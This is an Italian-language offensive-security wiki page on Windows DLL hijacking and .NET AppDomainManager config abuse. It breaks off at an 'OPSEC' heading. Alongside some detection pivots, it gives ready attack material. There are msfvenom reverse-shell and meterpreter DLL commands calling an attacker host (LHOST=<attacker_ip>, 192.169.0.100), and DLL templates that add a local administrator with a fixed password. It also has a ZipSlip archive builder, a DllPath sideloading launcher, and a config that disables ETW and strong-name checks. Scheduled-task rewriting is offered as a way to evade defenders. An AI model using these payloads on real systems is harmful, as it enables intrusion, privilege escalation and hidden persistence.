# Dll Hijacking

{{#include ../../../banners/hacktricks-training.md}}


## Informazioni di base

DLL Hijacking consiste nel manipolare un'applicazione attendibile affinché carichi una DLL malevola. Questo termine comprende diverse tattiche, come **DLL Spoofing, Injection e Side-Loading**. Viene utilizzato principalmente per l'esecuzione di codice e per ottenere persistenza e, più raramente, per l'escalation dei privilegi. Nonostante qui l'attenzione sia rivolta all'escalation, il metodo di hijacking rimane coerente indipendentemente dall'obiettivo.

### Tecniche comuni

Per il DLL hijacking vengono impiegati diversi metodi; la loro efficacia dipende dalla strategia adottata dall'applicazione per il caricamento delle DLL:<sup>[[4]](#references)</sup>

1. **DLL Replacement**: sostituzione di una DLL autentica con una malevola, utilizzando facoltativamente il DLL Proxying per preservare le funzionalità della DLL originale.
2. **DLL Search Order Hijacking**: posizionamento della DLL malevola in un percorso di ricerca precedente rispetto a quello legittimo, sfruttando il pattern di ricerca dell'applicazione.
3. **Phantom DLL Hijacking**: creazione di una DLL malevola che l'applicazione caricherà, ritenendo che si tratti di una DLL richiesta ma inesistente.
4. **DLL Redirection**: modifica di parametri di ricerca come `%PATH%` o dei file `.exe.manifest` / `.exe.local` per indirizzare l'applicazione verso la DLL malevola.
5. **WinSxS DLL Replacement**: sostituzione della DLL legittima con una controparte malevola nella directory WinSxS, un metodo spesso associato al DLL side-loading.
6. **Relative Path DLL Hijacking**: posizionamento della DLL malevola in una directory controllata dall'utente insieme all'applicazione copiata, in modo simile alle tecniche di Binary Proxy Execution.


### AppDomainManager hijacking (`<exe>.config` + attacker assembly)

Il classico DLL sideloading non è l'unico modo per fare in modo che un processo **.NET Framework** attendibile carichi codice dell'attaccante. Se l'eseguibile target è un'applicazione **managed**, il CLR consulta anche un file di configurazione dell'applicazione denominato in base al nome dell'eseguibile (ad esempio `Setup.exe.config`). Questo file può definire un **AppDomainManager** personalizzato. Se la configurazione fa riferimento a un assembly controllato dall'attaccante posizionato accanto all'EXE, il CLR lo carica **prima del normale percorso di esecuzione dell'applicazione** e lo esegue all'interno del processo attendibile.<sup>[[24]](#references)</sup>

Secondo lo schema di configurazione .NET Framework di Microsoft, sia `<appDomainManagerAssembly>` sia `<appDomainManagerType>` devono essere presenti affinché venga utilizzato il manager personalizzato.<sup>[[16]](#references)[[17]](#references)</sup>

Configurazione minima:
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="EvilMgr, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
<appDomainManagerType value="EvilMgr.Loader" />
</runtime>
</configuration>
```
Gestore minimale:
```csharp
using System; using System.Runtime.InteropServices;
public sealed class Loader : AppDomainManager {
[DllImport("user32.dll")] static extern int MessageBox(IntPtr h, string t, string c, int m);
public override void InitializeNewDomain(AppDomainSetup appDomainInfo) {
MessageBox(IntPtr.Zero, "Loaded inside trusted .NET host", "AppDomain hijack", 0);
}
}
```
Note pratiche:
- Questa tecnica è specifica di **.NET Framework**. Dipende dall'analisi della configurazione del CLR, non dall'ordine di ricerca delle DLL Win32.
- L'host deve essere realmente un **EXE managed**. Triage rapido: `sigcheck -m target.exe`, `corflags target.exe` oppure verifica la presenza del **CLR Runtime Header** nei metadati PE.
- Il nome del file di configurazione deve corrispondere esattamente al nome dell'eseguibile (`<binary>.config`) e di solito si trova **accanto all'EXE**.
- È utile con i binari **firmati di Microsoft/vendor** perché l'EXE trusted rimane invariato mentre l'assembly managed malevolo viene eseguito in-process.
- Se disponi già di una directory di installer/update scrivibile, l'hijacking di AppDomainManager può essere usato come **first stage**, seguito dal classico DLL sideloading o dal reflective loading per gli stage successivi.

### AppDomainManager come downloader + bootstrap di scheduled task

Un pattern di intrusione pratico consiste nell'abbinare l'EXE managed trusted a un `*.config` malevolo e a una DLL AppDomainManager malevola che funge solo da **small bootstrapper**:<sup>[[25]](#references)</sup>

1. L'utente avvia un installer o updater .NET firmato da una posizione plausibile come `%USERPROFILE%\Downloads`.
2. Il config adiacente fa sì che il CLR carichi l'assembly dell'attacker **prima** dell'avvio della logica legittima dell'applicazione.
3. Il manager malevolo esegue un **path gate** (ad esempio, continua solo se l'host EXE viene eseguito da `Downloads` e consente l'esecuzione del second stage solo da `%LOCALAPPDATA%`).
4. Se il controllo ha esito positivo, scarica il payload reale in un percorso scrivibile dall'utente come `%LOCALAPPDATA%\PerfWatson2.exe` e installa la persistenza tramite un scheduled task.

Perché questa variante è importante:
- L'host EXE firmato rimane invariato, quindi un triage che calcola l'hash solo del binario principale potrebbe non rilevare la compromissione.
- Il semplice **path-based anti-analysis** è comune: spostare la triade ZIP/EXE/DLL sul Desktop, in Temp o in un percorso sandbox può interrompere intenzionalmente la catena.
- La DLL AppDomainManager del first stage può rimanere piccola e a basso rumore, mentre l'impianto reale viene scaricato in seguito.

Esempio minimo di persistenza frequentemente osservato con questo pattern:
```cmd
schtasks /create /tn "GoogleUpdaterTaskSystem140.0.7272.0" /sc onlogon /tr "%LOCALAPPDATA%\PerfWatson2.exe" /rl highest /f
```
Note:
- ` /rl highest` significa **highest available** per quell'utente/sessione; di per sé non garantisce un'escalation a SYSTEM.
- Questa tecnica è spesso classificata meglio come **execution/persistence via .NET config abuse** piuttosto che come classico hijacking dell'ordine di ricerca delle DLL mancanti, anche se gli operatori spesso concatenano entrambe.

Pivot di rilevamento:
- Eseguibili .NET firmati avviati da **percorsi di estrazione ZIP**, `Downloads`, `%TEMP%` o altre cartelle scrivibili dall'utente, con un file `<exe>.config` **nella stessa directory**.
- Nuove attività pianificate la cui azione punta a `%LOCALAPPDATA%`, `%APPDATA%` o `Downloads` e i cui nomi imitano gli updater di browser/vendor.
- Processi bootstrap gestiti di breve durata che scaricano immediatamente un altro EXE e poi avviano `schtasks.exe`.
- Sample che terminano precocemente a meno che il percorso dell'eseguibile non corrisponda a una directory prevista nel profilo dell'utente.

### Hijacking di un'attività pianificata esistente per rilanciare la catena di sideload

Per la persistenza, non limitarti a cercare la **creazione di una nuova attività**. Alcuni intrusion set attendono che un installer legittimo crei una **normale attività di aggiornamento** e poi **riscrivono l'azione dell'attività**, in modo che il nome, l'autore e il trigger esistenti rimangano familiari ai difensori.

Workflow riutilizzabile:
1. Installa/avvia il software legittimo e identifica l'attività che normalmente crea.
2. Esporta l'XML dell'attività e annota i valori correnti di `<Exec><Command>` / `<Arguments>`.<sup>[[23]](#references)</sup>
3. Sostituisci solo l'azione, in modo che l'attività avvii il tuo **trusted host EXE** da una directory di staging scrivibile dall'utente; questo eseguirà il side-load oppure caricherà il payload reale tramite AppDomain.
4. Registra nuovamente lo stesso nome dell'attività invece di creare un nuovo artefatto di persistenza evidente.
```cmd
schtasks /query /tn "<TaskName>" /xml > task.xml
:: edit the <Exec><Command> and optional <Arguments> nodes
schtasks /create /tn "<TaskName>" /xml task.xml /f
```
Perché è più furtivo:
- Il nome dell'attività può continuare ad apparire legittimo (ad esempio, un updater di un vendor).
- Il servizio **Task Scheduler** la avvia, quindi la validazione del parent/ancestor spesso rileva la catena di scheduling prevista invece di `explorer.exe`.
- I team DFIR che cercano solo **nuovi nomi di attività** possono non rilevare un'attività la cui registrazione esisteva già, ma la cui action ora punta a `%LOCALAPPDATA%`, `%APPDATA%` o a un altro percorso controllato dall'attaccante.

Pivot rapidi per la ricerca:
- `schtasks /query /fo LIST /v | findstr /i "TaskName Task To Run"`
- `Get-ScheduledTask | % { [pscustomobject]@{TaskName=$_.TaskName; TaskPath=$_.TaskPath; Exec=($_.Actions | % Execute)} }`
- Confrontare l'XML di `C:\Windows\System32\Tasks\*` e i metadati di `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\*` con una baseline.
- Generare un alert quando un'attività updater dall'aspetto riconducibile a un vendor viene eseguita da **directory scrivibili dall'utente** o avvia un EXE .NET con un file `*.config` nella stessa directory.

> [!TIP]
> Per una catena step-by-step che combina HTML staging, configurazioni AES-CTR e implant .NET con il DLL sideloading, consultare il workflow seguente.

{{#ref}}
advanced-html-staged-dll-sideloading.md
{{#endref}}

## Individuare le DLL mancanti

Il modo più comune per trovare DLL mancanti all'interno di un sistema consiste nell'eseguire [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) di sysinternals, **impostando** i **2 filtri seguenti**:

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti all'interno di un sistema consiste nell'eseguire procmon di sysinternals, impostando i 2 filtri seguenti](<../../../images/image (961).png>)

![Tecniche comuni - Individuare le DLL mancanti: il modo più comune per trovare DLL mancanti all'interno di un sistema consiste nell'eseguire procmon di sysinternals, impostando i 2 filtri seguenti](<../../../images/image (230).png>)

e visualizzare solo la **File System Activity**:

![Tecniche comuni - Individuare le DLL mancanti: e visualizzare solo la File System Activity](<../../../images/image (153).png>)

Se si cercano **DLL mancanti in generale**, è necessario **lasciare** questa acquisizione attiva per alcuni **secondi**.\
Se si cerca una **DLL mancante all'interno di uno specifico eseguibile**, impostare un altro filtro come **"Process Name" "contains" `<exec name>`**, eseguirlo e interrompere l'acquisizione degli eventi.<sup>[[9]](#references)</sup>

## Sfruttare le DLL mancanti

Per effettuare privilege escalation, cercare una **DLL che un processo privilegiato tenta di caricare** da una posizione in cui è possibile scrivere. Questo può accadere quando si controlla una directory cercata prima di quella contenente la DLL legittima, oppure quando la DLL richiesta non esiste e si può scrivere in una delle directory cercate.

### Ordine di ricerca delle DLL

**All'interno della** [**documentazione Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **è possibile trovare informazioni dettagliate su come vengono caricate le DLL.**

Le **applicazioni Windows** cercano le DLL seguendo una serie di **percorsi di ricerca predefiniti**, rispettando una sequenza specifica. Il problema del DLL hijacking si verifica quando una DLL dannosa viene posizionata strategicamente in una di queste directory, assicurandosi che venga caricata prima della DLL autentica. Per prevenire questo problema, è possibile assicurarsi che l'applicazione utilizzi percorsi assoluti quando fa riferimento alle DLL necessarie.

Di seguito è riportato l'**ordine di ricerca delle DLL** sui sistemi **a 32 bit**:

1. La directory dalla quale l'applicazione è stata caricata.
2. La directory di sistema. Utilizzare la funzione [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) per ottenere il percorso di questa directory.(_C:\Windows\System32_)
3. La directory di sistema a 16 bit. Non esiste alcuna funzione che restituisca il percorso di questa directory, ma essa viene cercata. (_C:\Windows\System_)
4. La directory Windows. Utilizzare la funzione [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) per ottenere il percorso di questa directory.
1. (_C:\Windows_)
5. La directory corrente.
6. Le directory elencate nella variabile d'ambiente PATH. Si noti che questo non include il percorso per applicazione specificato dalla chiave di registro **App Paths**. La chiave **App Paths** non viene utilizzata nel calcolo del percorso di ricerca delle DLL.

Questo è l'ordine di ricerca **predefinito** con **SafeDllSearchMode** abilitato. Quando è disabilitato, la directory corrente passa al secondo posto. Per disabilitare questa funzionalità, creare il valore di registro **HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** e impostarlo su 0 (il valore predefinito è abilitato).

Se viene chiamata la funzione [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD_WITH_ALTERED_SEARCH_PATH**, la ricerca inizia nella directory del modulo eseguibile che **LoadLibraryEx** sta caricando.

Infine, una DLL può essere caricata tramite percorso assoluto anziché tramite nome. In questo caso, Windows cerca la DLL stessa solo in quel percorso; le dipendenze richieste tramite nome seguono comunque l'ordine di ricerca applicabile.

Esistono altri modi per modificare l'ordine di ricerca, ma non verranno spiegati qui.

### Concatenare una scrittura arbitraria di file a un hijack di DLL mancante

1. Utilizzare i filtri di **ProcMon** (`Process Name` = EXE target, `Path` ends with `.dll`, `Result` = `NAME NOT FOUND`) per raccogliere i nomi delle DLL che il processo cerca ma non trova.<sup>[[14]](#references)</sup>
2. Se il binary viene eseguito tramite **schedule/service**, il posizionamento di una DLL con uno di quei nomi nella **directory dell'applicazione** (voce n. 1 dell'ordine di ricerca) farà sì che venga caricata alla successiva esecuzione. In un caso riguardante uno scanner .NET, il processo cercava `hostfxr.dll` in `C:\samples\app\` prima di caricare la copia reale da `C:\Program Files\dotnet\fxr\...`.
3. Creare una DLL payload (ad esempio, una reverse shell) con una export qualsiasi: `msfvenom -p windows/x64/shell_reverse_tcp LHOST=<attacker_ip> LPORT=443 -f dll -o hostfxr.dll`.
4. Se la primitive è una **scrittura arbitraria in stile ZipSlip**, creare uno ZIP la cui entry esca dalla directory di estrazione, in modo che la DLL venga depositata nella cartella dell'applicazione:
```python
import zipfile
with zipfile.ZipFile("slip-shell.zip", "w") as z:
z.writestr("../app/hostfxr.dll", open("hostfxr.dll","rb").read())
```
5. Consegna l'archivio alla inbox/condivisione monitorata; quando l'attività pianificata riavvia il processo, questo carica la DLL malevola ed esegue il tuo codice con l'account del servizio.

### Forzare il sideloading tramite RTL_USER_PROCESS_PARAMETERS.DllPath

Un metodo avanzato per influenzare in modo deterministico il percorso di ricerca delle DLL di un processo appena creato consiste nell'impostare il campo DllPath in RTL_USER_PROCESS_PARAMETERS durante la creazione del processo con le API native di ntdll. Fornendo qui una directory controllata dall'attaccante, un processo target che risolve una DLL importata tramite il nome (senza percorso assoluto e senza usare i flag di caricamento sicuro) può essere forzato a caricare una DLL malevola da quella directory.

Idea chiave
- Crea i parametri del processo con RtlCreateProcessParametersEx e fornisci un DllPath personalizzato che punti alla tua cartella controllata (ad esempio, la directory in cui si trovano il tuo dropper/unpacker).
- Crea il processo con RtlCreateUserProcess. Quando il binario target risolve una DLL tramite il nome, il loader consulterà il DllPath fornito durante la risoluzione, consentendo un sideloading affidabile anche quando la DLL malevola non si trova nella stessa directory dell'EXE target.

Note/limitazioni
- Questo influisce sul processo figlio in fase di creazione; è diverso da SetDllDirectory, che influisce solo sul processo corrente.
- Il target deve importare o eseguire LoadLibrary su una DLL tramite il nome (senza percorso assoluto e senza usare LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories).
- KnownDLLs e i percorsi assoluti hardcoded non possono essere hijacked. Gli export inoltrati e SxS possono modificare la precedenza.

Esempio C minimo (ntdll, stringhe wide, gestione degli errori semplificata):

<details>
<summary>Esempio C completo: forzare il sideloading di DLL tramite RTL_USER_PROCESS_PARAMETERS.DllPath</summary>
```c
#include <windows.h>
#include <winternl.h>
#pragma comment(lib, "ntdll.lib")

// Prototype (not in winternl.h in older SDKs)
typedef NTSTATUS (NTAPI *RtlCreateProcessParametersEx_t)(
PRTL_USER_PROCESS_PARAMETERS *pProcessParameters,
PUNICODE_STRING ImagePathName,
PUNICODE_STRING DllPath,
PUNICODE_STRING CurrentDirectory,
PUNICODE_STRING CommandLine,
PVOID Environment,
PUNICODE_STRING WindowTitle,
PUNICODE_STRING DesktopInfo,
PUNICODE_STRING ShellInfo,
PUNICODE_STRING RuntimeData,
ULONG Flags
);

typedef NTSTATUS (NTAPI *RtlCreateUserProcess_t)(
PUNICODE_STRING NtImagePathName,
ULONG Attributes,
PRTL_USER_PROCESS_PARAMETERS ProcessParameters,
PSECURITY_DESCRIPTOR ProcessSecurityDescriptor,
PSECURITY_DESCRIPTOR ThreadSecurityDescriptor,
HANDLE ParentProcess,
BOOLEAN InheritHandles,
HANDLE DebugPort,
HANDLE ExceptionPort,
PRTL_USER_PROCESS_INFORMATION ProcessInformation
);

static void DirFromModule(HMODULE h, wchar_t *out, DWORD cch) {
DWORD n = GetModuleFileNameW(h, out, cch);
for (DWORD i=n; i>0; --i) if (out[i-1] == L'\\') { out[i-1] = 0; break; }
}

int wmain(void) {
// Target Microsoft-signed, DLL-hijackable binary (example)
const wchar_t *image = L"\\??\\C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe";

// Build custom DllPath = directory of our current module (e.g., the unpacked archive)
wchar_t dllDir[MAX_PATH];
DirFromModule(GetModuleHandleW(NULL), dllDir, MAX_PATH);

UNICODE_STRING uImage, uCmd, uDllPath, uCurDir;
RtlInitUnicodeString(&uImage, image);
RtlInitUnicodeString(&uCmd, L"\"C:\\Program Files\\Windows Defender Advanced Threat Protection\\SenseSampleUploader.exe\"");
RtlInitUnicodeString(&uDllPath, dllDir);      // Attacker-controlled directory
RtlInitUnicodeString(&uCurDir, dllDir);

RtlCreateProcessParametersEx_t pRtlCreateProcessParametersEx =
(RtlCreateProcessParametersEx_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateProcessParametersEx");
RtlCreateUserProcess_t pRtlCreateUserProcess =
(RtlCreateUserProcess_t)GetProcAddress(GetModuleHandleW(L"ntdll.dll"), "RtlCreateUserProcess");

RTL_USER_PROCESS_PARAMETERS *pp = NULL;
NTSTATUS st = pRtlCreateProcessParametersEx(&pp, &uImage, &uDllPath, &uCurDir, &uCmd,
NULL, NULL, NULL, NULL, NULL, 0);
if (st < 0) return 1;

RTL_USER_PROCESS_INFORMATION pi = {0};
st = pRtlCreateUserProcess(&uImage, 0, pp, NULL, NULL, NULL, FALSE, NULL, NULL, &pi);
if (st < 0) return 1;

// Resume main thread etc. if created suspended (not shown here)
return 0;
}
```
</details>

Esempio di utilizzo operativo
- Inserisci una `xmllite.dll` malevola (che esporti le funzioni richieste o faccia da proxy verso quella reale) nella directory `DllPath`.
- Avvia un binary firmato noto per cercare `xmllite.dll` in base al nome usando la tecnica descritta sopra. Il loader risolve l'import tramite il `DllPath` fornito ed esegue il sideload della tua DLL.

Questa tecnica è stata osservata in-the-wild per orchestrare catene di sideloading multi-stage: un launcher iniziale rilascia una DLL helper, che avvia quindi un binary firmato da Microsoft e vulnerabile all'hijacking, con un `DllPath` personalizzato per forzare il caricamento della DLL dell'attacker da una directory di staging.<sup>[[6]](#references)</sup>


### .NET AppDomainManager hijacking tramite `.exe.config`

Per i target **.NET Framework**, il sideloading può essere eseguito **prima di `Main()`** senza patchare la memoria, abusando del file **`.exe.config`** adiacente all'applicazione. Invece di affidarsi solo all'ordine di ricerca delle DLL Win32, l'attacker posiziona un EXE .NET legittimo accanto a una config malevola e a uno o più assembly controllati dall'attacker.

Come funziona la catena:<sup>[[15]](#references)[[22]](#references)</sup>
1. L'host EXE si avvia e il **CLR legge `<exe>.config`**.
2. La config imposta **`<appDomainManagerAssembly>`** e **`<appDomainManagerType>`**, in modo che il runtime istanzi un `AppDomainManager` controllato dall'attacker.
3. Il manager malevolo ottiene l'**esecuzione pre-`Main()`** all'interno del processo host trusted.
4. La stessa config può forzare il CLR a risolvere prima gli assembly locali (ad esempio `InitInstall.dll`, `Updater.dll`, `uevmonitor.dll`) e può indebolire la validation/telemetry del runtime senza patching inline.

Pattern in stile campagna (il nesting esatto può variare in base alla direttiva / versione del CLR):
```xml
<configuration>
<runtime>
<appDomainManagerAssembly value="Updater" />
<appDomainManagerType value="MyAppDomainManager" />
<assemblyBinding xmlns="urn:schemas-microsoft-com:asm.v1">
<probing privatePath="." />
<publisherPolicy apply="no" />
</assemblyBinding>
<bypassTrustedAppStrongNames enabled="true" />
<etwEnable enabled="false" />
</runtime>
<startup>
<requiredRuntime version="v4.0.30319" safemode="true" />
</startup>
</configuration>
```
Perché è utile:
- **`<probing privatePath="."/>`** mantiene la risoluzione degli assembly nella directory dell'applicazione, trasformando la cartella in una superficie di sideloading prevedibile.<sup>[[18]](#references)</sup>
- **`<appDomainManagerAssembly>` + `<appDomainManagerType>`** spostano l'esecuzione nel codice dell'attaccante durante l'inizializzazione del CLR, prima dell'esecuzione della logica dell'applicazione legittima.<sup>[[16]](#references)[[17]](#references)</sup>
- **`<bypassTrustedAppStrongNames enabled="true"/>`** può consentire a un'app full-trust di caricare assembly non firmati o manomessi senza generare un errore di validazione strong-name.<sup>[[19]](#references)</sup>
- **`<publisherPolicy apply="no"/>`** evita i redirect delle publisher policy verso assembly più recenti.<sup>[[20]](#references)</sup>
- **`<requiredRuntime ... safemode="true"/>`** rende più deterministica la selezione del runtime.<sup>[[21]](#references)</sup>
- **`<etwEnable enabled="false"/>`** è particolarmente interessante perché il **CLR disabilita la propria visibilità ETW** dalla configurazione, invece di eseguire il patching di `EtwEventWrite` in memoria.

Pattern operativo osservato nelle campagne recenti:
- Stage 1 rilascia `setup.exe`, `setup.exe.config` e gli assembly locali.
- Stage 2 li copia in una cartella **AppData update** credibile, rinomina l'host con un nome come `update.exe` e lo riavvia tramite un **scheduled task**.
- Stage 3 verifica il contesto di esecuzione (ad esempio il parent previsto `svchost.exe` da Task Scheduler) prima di caricare la DLL/export RAT finale.

Idee per l'hunting:
- **Eseguibili .NET** firmati o comunque legittimi in esecuzione con file **`.config`** adiacenti sospetti in posizioni scrivibili dall'utente.
- File `.config` contenenti **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** o **`etwEnable enabled="false"`**.
- Scheduled task che riavviano binari update rinominati da **`%LOCALAPPDATA%`** o da directory specifiche dell'app come `\bin\update\`.
- Catene parent/child in cui un scheduled task avvia un host .NET attendibile che carica immediatamente assembly non appartenenti al vendor dalla propria directory.

#### Eccezioni all'ordine di ricerca delle dll secondo la documentazione Windows

Nella documentazione Windows sono indicate alcune eccezioni all'ordine standard di ricerca delle DLL:

- Quando viene rilevata una **DLL che condivide il nome con una già caricata in memoria**, il sistema ignora la ricerca abituale. Esegue invece un controllo per verificare un'eventuale redirection e un manifest, prima di utilizzare la DLL già presente in memoria. **In questo scenario, il sistema non esegue una ricerca della DLL**.
- Nei casi in cui la DLL sia riconosciuta come **known DLL** per la versione corrente di Windows, il sistema utilizza la propria versione della known DLL, insieme alle eventuali DLL dipendenti, **saltando il processo di ricerca**. La chiave di registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene un elenco di queste known DLL.
- Se una **DLL ha dipendenze**, la ricerca di queste DLL dipendenti viene eseguita come se fossero indicate soltanto tramite i loro **module names**, indipendentemente dal fatto che la DLL iniziale sia stata identificata tramite un percorso completo.

### Escalation dei privilegi

**Requisiti**:

- Identificare un processo che opera o opererà con **privilegi diversi** (movimento orizzontale o laterale) e a cui manca una DLL.
- Assicurarsi che sia disponibile l'**accesso in scrittura** a qualsiasi **directory** in cui verrà effettuata la ricerca della **DLL**. Questa posizione potrebbe essere la directory dell'eseguibile o una directory inclusa nel system path.

Questi prerequisiti non sono comuni per impostazione predefinita: gli eseguibili privilegiati normalmente non hanno dipendenze DLL mancanti e gli utenti standard normalmente non possono scrivere nelle directory del system search-path. Gli ambienti configurati in modo errato possono comunque esporre entrambe le condizioni.\
Se i requisiti sono soddisfatti, consulta il progetto [UACME](https://github.com/hfiref0x/UACME). Sebbene il suo obiettivo principale sia l'UAC bypass, contiene PoC di DLL hijacking per versioni specifiche di Windows, che spesso possono essere adattati alla directory scrivibile individuata.

Nota che puoi **verificare i tuoi permessi in una cartella** eseguendo:<sup>[[5]](#references)</sup>
```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```
E **controlla i permessi di tutte le cartelle all'interno di PATH**:
```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```
Puoi anche controllare gli import di un eseguibile e gli export di una dll con:
```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```
Per una guida completa su come **abusare del Dll Hijacking per effettuare un’escalation dei privilegi** con permessi di scrittura in una **cartella del System Path**, consulta:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### Strumenti automatizzati

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)verificherà se disponi di permessi di scrittura su una qualsiasi cartella all’interno del system PATH.\
Altri strumenti automatizzati interessanti per individuare questa vulnerabilità sono le funzioni di **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ e _Write-HijackDll._

### Esempio

Nel caso in cui trovi uno scenario sfruttabile, una delle cose più importanti per riuscire a sfruttarlo sarebbe **creare una dll che esporti almeno tutte le funzioni che l’eseguibile importerà da essa**. In ogni caso, tieni presente che il Dll Hijacking è utile per [effettuare l’escalation dal livello Medium Integrity al livello High **(bypassando UAC)**](../../authentication-credentials-uac-and-efs/index.html#uac) o da[ **High Integrity a SYSTEM**](../index.html#from-high-integrity-to-system)**.** Puoi trovare un esempio di **come creare una dll valida** all’interno di questo studio sul dll hijacking, incentrato sul dll hijacking per l’execution: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
Inoltre, nella **sezione successiv**a puoi trovare alcuni **codici dll di base** che potrebbero essere utili come **template** o per creare una **dll con funzioni esportate non richieste**.

## **Creazione e compilazione di Dll**

### **Dll Proxifying**

Fondamentalmente, un **Dll proxy** è una Dll in grado di **eseguire il tuo codice malevolo quando viene caricata**, ma anche di **esporre** e **funzionare** come **previsto**, inoltrando tutte le chiamate alla libreria reale.

Con lo strumento [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puoi effettivamente **indicare un eseguibile e selezionare la libreria** di cui vuoi creare il proxy e **generare una dll proxificata**, oppure **indicare la Dll** e **generare una dll proxificata**.

### **Meterpreter**

**Get rev shell (x64):**
```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Ottieni un meterpreter (x86):**
```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```
**Crea un utente (x86, non ho visto una versione x64):**
```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```
### Il tuo

In molti casi, la DLL compilata deve **esportare ogni funzione importata dal processo vittima**. Se manca un'esportazione necessaria, il binario non può risolverla e l'exploit fallisce.

<details>
<summary>Modello di DLL in C (Win10)</summary>
```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
switch(dwReason){
case DLL_PROCESS_ATTACH:
system("whoami > C:\\users\\username\\whoami.txt");
WinExec("calc.exe", 0); //This doesn't accept redirections like system
break;
case DLL_PROCESS_DETACH:
break;
case DLL_THREAD_ATTACH:
break;
case DLL_THREAD_DETACH:
break;
}
return TRUE;
}
```
</details>
```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Esempio di DLL C++ con creazione di utente</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>DLL C alternativa con punto di ingresso del thread</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Case Study: Narrator OneCore TTS Localization DLL Hijack (Accessibility/ATs)

Windows Narrator.exe continua a cercare all'avvio una DLL di localizzazione prevedibile e specifica per la lingua, che può essere hijacked per l'esecuzione di codice arbitrario e la persistenza.<sup>[[7]](#references)</sup>

Fatti chiave
- Percorso di ricerca (build attuali): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Percorso legacy (build precedenti): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Se nel percorso OneCore è presente una DLL controllata dall'attaccante e scrivibile, questa viene caricata ed esegue `DllMain(DLL_PROCESS_ATTACH)`. Non sono richiati export.

Discovery con Procmon
- Filtro: `Process Name is Narrator.exe` e `Operation is Load Image` o `CreateFile`.
- Avvia Narrator e osserva il tentativo di caricamento del percorso indicato sopra.

DLL minimale
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
Silenzio OPSEC
